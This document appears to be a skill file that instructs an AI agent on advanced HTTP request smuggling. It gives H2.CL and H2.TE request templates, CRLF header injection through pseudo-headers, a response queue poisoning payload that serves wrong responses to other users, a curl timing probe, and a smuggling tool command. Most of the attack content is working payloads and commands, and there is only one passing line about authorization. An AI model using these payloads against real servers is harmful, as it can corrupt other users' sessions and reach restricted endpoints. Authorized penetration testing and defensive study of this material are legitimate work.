---
name: http-smuggling-advanced
description: "Advanced HTTP desync: HTTP/2 downgrade smuggling, header injection, and response queue poisoning. Use this skill when classic CL.TE/TE.CL is blocked but an HTTP/2 front-end exists."
---

# Advanced Desync

## Overview

HTTP/2 fronts often downgrade to HTTP/1.1 at the back-end. The translation layer is where desync lives.

## H2.CL

HTTP/2 has no `Content-Length` requirement, but the front-end may forward a client-supplied one.

```http
:method: POST
:path: /
content-length: 0

GET /admin HTTP/1.1
Host: target
```

If the back-end honors the injected `Content-Length: 0`, the appended bytes become a new request.

## H2.TE

```
transfer-encoding: chunked
```
in a CRLF-injected header value.

## Header injection via pseudo-headers

Some front-ends concatenate header values without validation. `:path: / HTTP/1.1\r\nHost: x` can inject.

## Response queue poisoning

Smuggle a request whose response is not consumed; the next request receives the wrong response.

```
0

GET /404 HTTP/1.1
Host: target
```

The next user gets a 404 page instead of their content — proof of queue poisoning.

## Detection strategy

1. Confirm the front-end protocol (`curl -I` vs `curl --http2`).
2. Send a request with a body the back-end will hang on.
3. Measure response time differences (5s hang = desync).
4. Escalate to a concrete effect.

```bash
# timing probe
time curl -s -X POST https://target/ -H "Transfer-Encoding: chunked" \
  -H "Content-Length: 6" --data-binary $'0\r\n\r\nX'
```

## Tools

```bash
# Burp: HTTP Request Smuggler extension (has H2 probes)
# or
python3 h2csmuggler.py -u https://target
```

## Pitfalls

- Many CDNs now reject both headers simultaneously.
- False positives from slow back-ends look like desync — repeat the probe.
- Smuggling can corrupt other users' sessions; test with care and authorization.

## Verification

A reproducible response mismatch for a subsequent request on the same connection proves desync.
